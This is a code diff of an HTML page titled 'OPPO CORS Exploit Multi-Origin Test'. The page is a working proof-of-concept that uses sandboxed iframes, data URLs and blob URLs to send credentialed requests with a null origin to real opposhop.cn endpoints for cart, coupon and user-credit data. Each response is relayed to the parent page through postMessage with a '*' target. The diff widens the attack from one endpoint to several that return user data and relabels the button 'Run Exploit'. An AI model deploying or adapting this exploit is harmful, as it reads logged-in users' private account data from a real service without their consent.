@@ -3,16 +3,15 @@
 
 <head>
 <meta charset="UTF-8">
-<title>OPPO CORS Exploit PoC</title>
+<title>OPPO CORS Exploit Tests</title>
 
 <style>
 
 body{
-font-family: Arial, sans-serif;
+font-family:Arial;
 background:#eef2f7;
 margin:0;
 padding:30px;
-color:#222;
 }
 
 .container{
@@ -20,21 +19,12 @@ max-width:1100px;
 margin:auto;
 }
 
-h1{
-text-align:center;
-margin-bottom:10px;
-}
-
-.description{
-text-align:center;
-margin-bottom:30px;
-}
+h1{text-align:center}
 
 button{
 display:block;
 margin:20px auto;
 padding:12px 30px;
-font-size:16px;
 background:#2e7df6;
 color:white;
 border:none;
@@ -44,24 +34,18 @@ cursor:pointer;
 
 .card{
 background:white;
-padding:18px;
-border-radius:10px;
-box-shadow:0 2px 8px rgba(0,0,0,0.08);
-margin-bottom:20px;
-}
-
-.label{
-font-weight:bold;
-margin-bottom:6px;
+padding:15px;
+margin-bottom:15px;
+border-radius:8px;
+box-shadow:0 2px 6px rgba(0,0,0,.1);
 }
 
 pre{
 background:#f5f6f8;
-padding:12px;
+padding:10px;
 border-radius:6px;
 white-space:pre-wrap;
 word-break:break-word;
-font-size:13px;
 }
 
 </style>
@@ -72,13 +56,9 @@ font-size:13px;
 
 <div class="container">
 
-<h1>OPPO CORS Origin Bypass Tests</h1>
+<h1>OPPO CORS Exploit Multi-Origin Test</h1>
 
-<div class="description">
-Testing different techniques to generate <b>null origin</b> requests.
-</div>
-
-<button onclick="runTests()">Run Tests</button>
+<button onclick="runTests()">Run Exploit</button>
 
 <div id="results"></div>
 
@@ -88,32 +68,46 @@ Testing different techniques to generate <b>null origin</b> requests.
 
 <script>
 
-const endpoint="https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
+const endpoints={
 
-function createCard(title,id){
+cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+
+}
+
+function createCard(name,method){
+
+let id=method+"_"+name
 
 let div=document.createElement("div")
 div.className="card"
 
 div.innerHTML=
-'<div class="label">'+title+'</div>'+
-'<div>Status: <span id="'+id+'_status">waiting</span></div>'+
-'<pre id="'+id+'_data"></pre>'
+"<b>"+method.toUpperCase()+" → "+name+"</b>"+
+"<div>Status: <span id='"+id+"_status'>waiting</span></div>"+
+"<pre id='"+id+"_data'></pre>"
 
 document.getElementById("results").appendChild(div)
 
 }
 
-createCard("Sandbox iframe test","sandbox")
-createCard("Data URL test","data")
-createCard("Blob URL test","blob")
+for(let e in endpoints){
+
+createCard(e,"sandbox")
+createCard(e,"data")
+createCard(e,"blob")
+
+}
 
 window.addEventListener("message",e=>{
 
-if(!e.data.type) return
+let d=e.data
+let id=d.method+"_"+d.endpoint
 
-document.getElementById(e.data.type+"_status").innerText=e.data.status
-document.getElementById(e.data.type+"_data").innerText=e.data.body
+document.getElementById(id+"_status").innerText=d.status
+document.getElementById(id+"_data").innerText=d.body
 
 })
 
@@ -125,41 +119,49 @@ runBlob()
 
 }
 
-function runSandbox(){
+function buildScript(method){
 
-let code=`
+return `
 <script>
 
-fetch("${endpoint}",{credentials:"include"})
+const endpoints=${JSON.stringify(endpoints)}
+
+for(let name in endpoints){
+
+fetch(endpoints[name],{credentials:"include"})
 .then(r=>r.text().then(t=>{
-parent.postMessage({type:"sandbox",status:r.status,body:t},"*")
+parent.postMessage({
+method:"${method}",
+endpoint:name,
+status:r.status,
+body:t
+},"*")
 }))
 .catch(e=>{
-parent.postMessage({type:"sandbox",status:"error",body:e.toString()},"*")
+parent.postMessage({
+method:"${method}",
+endpoint:name,
+status:"error",
+body:e.toString()
+},"*")
 })
+
+}
 
 <\/script>
 `
 
-document.getElementById("sandboxFrame").srcdoc=code
+}
+
+function runSandbox(){
+
+document.getElementById("sandboxFrame").srcdoc=buildScript("sandbox")
 
 }
 
 function runData(){
 
-let code=`
-<script>
-
-fetch("${endpoint}",{credentials:"include"})
-.then(r=>r.text().then(t=>{
-parent.postMessage({type:"data",status:r.status,body:t},"*")
-}))
-.catch(e=>{
-parent.postMessage({type:"data",status:"error",body:e.toString()},"*")
-})
-
-<\/script>
-`
+let code=buildScript("data")
 
 let url="data:text/html;base64,"+btoa(code)
 
@@ -173,21 +175,10 @@ document.body.appendChild(iframe)
 
 function runBlob(){
 
-let code=`
-<script>
-
-fetch("${endpoint}",{credentials:"include"})
-.then(r=>r.text().then(t=>{
-parent.postMessage({type:"blob",status:r.status,body:t},"*")
-}))
-.catch(e=>{
-parent.postMessage({type:"blob",status:"error",body:e.toString()},"*")
-})
-
-<\/script>
-`
+let code=buildScript("blob")
 
 let blob=new Blob([code],{type:"text/html"})
+
 let url=URL.createObjectURL(blob)
 
 let iframe=document.createElement("iframe")
